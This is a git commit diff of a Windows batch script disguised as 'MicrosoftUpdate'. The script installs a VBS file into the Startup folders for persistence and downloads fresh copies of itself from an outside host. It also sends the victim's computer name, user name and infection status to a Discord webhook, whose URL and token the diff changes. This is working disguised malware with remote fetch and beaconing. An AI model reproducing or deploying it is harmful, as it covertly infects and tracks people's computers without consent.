5d4269aa6bb265c5b768433118f09a3992cb1400
freestream <99094491+freestream-us-to@users.noreply.github.com>
2022-11-27 00:53:02 +0100

    Add files via upload

--- MicrosoftUpdate.bat
+++ MicrosoftUpdate.bat
@@ -26,7 +26,9 @@ set userauto=YES
 )
 if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
 copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+timeout /t 10
 curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs" --output "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
+timeout /t 10
 set userauto=YES, NEW CREATED
 )
 
@@ -40,11 +42,14 @@ set pcauto=NO, NOT CREATED
 
 
 set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1045852501590675476/fUqcJcCA2TNtHiOLTIrcBJgZDFD_BPWpPoyud-5z3ucLn2fNWquHobLnEiglQtOMwb3v
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1046074645612335154/cqFXfvKa33ETOYQEiyJWJP_RhPFciwxl7qcEcFzsbFYd4mh5Xqah3yfBg54a50Jh7MFH
 
 
+timeout /t 10
 curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%APPDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"
+timeout /t 10
 curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%PROGRAMDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"
+timeout /t 10
 
 
 if %~dp0 NEQ %APPDATA%\MicrosoftUpdate\ (
